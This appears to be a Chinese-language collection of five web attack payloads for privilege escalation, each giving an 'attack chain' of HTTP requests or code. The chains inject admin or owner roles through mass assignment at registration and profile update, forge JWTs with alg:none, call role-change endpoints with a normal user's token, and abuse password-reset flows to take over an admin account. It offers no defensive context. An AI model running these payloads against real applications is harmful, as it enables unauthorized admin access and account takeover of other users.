_5 条 web payload_

---

### 参数篡改提权  `param-role-escalation`
子类：**Mass Assignment** · tags: `role` `privilege` `mass-assignment`

**前置条件：**
- 后端直接接受并绑定客户端传入的角色/权限字段

**攻击链：**

```http
POST /api/register HTTP/1.1
{"username":"attacker","password":"pass","role":"admin","isAdmin":true}

# 更新个人信息时尝试修改角色
PUT /api/users/me HTTP/1.1
{"name":"attacker","role":"admin","permissions":["*"]}

# 组织成员邀请
POST /api/org/invite HTTP/1.1
{"email":"attacker@x.com","role":"owner"}
```

### JWT Claims 篡改  `jwt-claim-escalation`
子类：**JWT提权** · tags: `jwt` `claims` `alg`

**攻击链：**

```bash
# 解码JWT payload
echo "eyJ1c2VyIjoiYWxpY2UiLCJyb2xlIjoidXNlciJ9" | base64 -d
# 修改 role 字段，尝试无效签名/弱密钥

# python-jwt 工具
python3 -c "
import jwt, base64, json
payload = {'user':'alice','role':'admin','is_admin':True}
# 尝试 alg:none
header = base64.b64encode(b'{\"alg\":\"none\",\"typ\":\"JWT\"}').decode()
body = base64.b64encode(json.dumps(payload).encode()).decode()
print(f'{header}.{body}.')
"
```

### 注册时指定高权限角色  `register-high-role`
子类：**注册提权** · tags: `register` `role` `admin`

**攻击链：**

```http
# 观察普通注册请求
POST /api/register HTTP/1.1
{"email":"user@x.com","password":"pass","plan":"free"}

# 尝试追加/修改权限字段
POST /api/register HTTP/1.1
{
  "email":"attacker@x.com",
  "password":"pass",
  "plan":"enterprise",
  "role":"admin",
  "account_type":"staff",
  "internal": true,
  "verified": true
}
```

### 未校验角色的API修改操作  `unauth-role-modify`
子类：**越权修改** · tags: `role` `unauth` `admin-api`

**攻击链：**

```http
# 直接调用角色修改接口
PATCH /api/users/me/role HTTP/1.1
Authorization: Bearer <normal_user_token>
{"role": "admin"}

# 组织角色提升
PUT /api/org/members/me HTTP/1.1
{"role": "owner", "permissions": ["billing","settings","members"]}
```

### 密码重置流程提权  `reset-flow-escalation`
子类：**流程提权** · tags: `password-reset` `token` `admin`

**攻击链：**

```http
# 发起管理员账号密码重置
POST /api/password-reset HTTP/1.1
{"email": "admin@target.com"}

# 若重置token可从JS/API猜测，则重置管理员密码
POST /api/password-reset/confirm HTTP/1.1
{"token": "<guessed>", "password": "NewPass123!"}

# 通过自己账号token重置他人账号（IDOR in reset）
POST /api/password-reset/confirm HTTP/1.1
{"token": "<my_token>", "user_id": 1, "password": "NewPass123!"}
```
